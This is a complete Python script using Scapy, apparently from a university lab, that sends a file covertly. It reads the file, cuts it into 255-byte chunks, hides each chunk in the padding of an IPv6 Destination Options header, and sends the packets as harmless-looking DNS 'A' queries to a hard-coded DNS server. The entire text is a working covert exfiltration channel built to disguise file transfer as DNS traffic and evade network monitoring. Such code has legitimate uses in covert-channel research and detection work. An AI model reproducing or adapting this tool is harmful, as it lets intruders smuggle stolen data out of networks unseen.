#!/usr/bin/python
import sys
import time
import socket
from scapy.all import *
# Dst: NCNU Ubuntu DNS Server
dnsMAC = b'\x00\x0c\x29\xc3\x6f\xa7'
dnsIP = '2001:e10:6840:22:20c:29ff:fec3:6fa7'
# Src: NCNU Local Host
clientMAC = b'\x00\x50\x56\x87\xa2\xaf'
clientIP = '2001:e10:6840:22:250:56ff:fe87:a2af'
ethertype = b"\x86\xdd" # IPv6
whohas = sys.argv[2] # Ask for DNS Record
# Process the binary file to send
start = time.time() # Timer
filename = sys.argv[1]
bin_file = open(filename, "rb")
raw_bytes = bin_file.read()
n = 255 # Split the message into groups
msglist = [raw_bytes[i:i+n] for i in range(0, len(raw_bytes), n)]
# Send
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
s.bind(('ens160', 0))
pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(optdata=filename))/UDP(dport=53)/DNS(id=0, qd=DNSQR(qname=whohas, qtype="A"))
s.sendall(dnsMAC + clientMAC + ethertype + bytes(pkt))
#send(pkt,verbose=0)
for i in range(len(msglist)):
    myid = i + 1
    pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(optdata=msglist[i]))/UDP(dport=53)/DNS(id=myid, qd=DNSQR(qname=whohas, qtype="A"))
    #send(pkt,verbose=0)
    s.sendall(dnsMAC + clientMAC + ethertype + bytes(pkt))
stop = time.time() # Timer
print("Finished sending {} packets.".format(len(msglist)+1))
print("Time: {:.2f} seconds.".format(stop - start))
s.close()
